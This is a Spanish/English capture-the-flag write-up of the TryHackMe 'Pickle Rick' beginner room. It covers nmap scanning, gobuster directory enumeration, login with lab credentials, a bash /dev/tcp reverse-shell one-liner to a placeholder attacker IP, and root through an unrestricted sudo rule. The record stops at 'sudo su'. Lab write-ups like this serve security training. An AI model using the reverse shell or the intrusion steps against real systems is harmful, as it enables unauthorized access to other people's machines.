# Write-up: Pickle Rick (TryHackMe)

**Fecha:** 27 de marzo, 2026  
**Objetivo:** Obtener acceso de superusuario (root) y leer la bandera/correo de felicitación.  
**Dificultad:** Principiante

---

## 1. Reconocimiento y Enumeración de Red

El primer paso fue identificar la dirección IP de la máquina objetivo dentro de la red local.

```bash
$ ping -c 1 10.65.187.137
PING 10.65.187.137 (10.65.187.137) 56(84) bytes of data.
64 bytes from 10.65.187.137: icmp_seq=1 ttl=62 time=93.7 ms

--- 10.65.187.137 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 93.727/93.727/93.727/0.000 ms

```

---

## 2. Escaneo de Puertos y Servicios

Se realizó un escaneo profundo para determinar qué puertas estaban abiertas y qué versiones de software se estaban ejecutando.

```bash
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.65.187.137 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 16:09 -0600
Initiating SYN Stealth Scan at 16:09
Scanning 10.65.187.137 [65535 ports]
Discovered open port 22/tcp on 10.65.187.137
Discovered open port 80/tcp on 10.65.187.137
Completed SYN Stealth Scan at 16:09, 13.24s elapsed (65535 total ports)
Nmap scan report for 10.65.187.137
Host is up, received user-set (0.082s latency).
Scanned at 2026-03-27 16:09:10 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds
           Raw packets sent: 65773 (2.894MB) | Rcvd: 65772 (2.631MB)

$ nmap -sCV -p22,80 10.65.187.137 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 16:09 -0600
Nmap scan report for 10.65.187.137 (10.65.187.137)
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:7c:d6:db:67:50:50:6c:20:78:44:a0:82:f1:c2:fd (RSA)
|   256 ac:13:ca:72:cd:a9:57:4a:7e:fa:1d:6d:18:46:c8:2c (ECDSA)
|_  256 b7:bb:37:89:63:3e:dc:ce:cb:f1:23:f3:79:72:3f:f3 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds



```

---

## 3. Dirctory and file listing

```bash
$ gobuster dir -u http://10.65.187.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x txt,jpg,pdf
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.187.137
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,jpg,pdf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 315] [--> http://10.65.187.137/assets/]
robots.txt           (Status: 200) [Size: 17]
Progress: 38662 / 882236 (4.38%)

$ gobuster dir -u http://10.65.187.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x txt,php,js
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.187.137
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login.php            (Status: 200) [Size: 882]
assets               (Status: 301) [Size: 315] [--> http://10.65.187.137/assets/]
portal.php           (Status: 302) [Size: 0] [--> /login.php]
robots.txt           (Status: 200) [Size: 17]
Progress: 106134 / 882236 (12.03%)


```

---

## 4.System Access
- Put the credentials in the login.php

```bash
# user: R1ckRul3s
# pass: Wubbalubbadubdub

# Sending a reverse shell
bash -c 'bash -i >& /dev/tcp/IP_ATTACKER/4321 0>&1'

```

---

## 5. Privilege Escalation

```bash
$ sudo -l

Matching Defaults entries for www-data on ip-10-65-187-137:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-65-187-137:
    (ALL) NOPASSWD: ALL

$ sudo su

```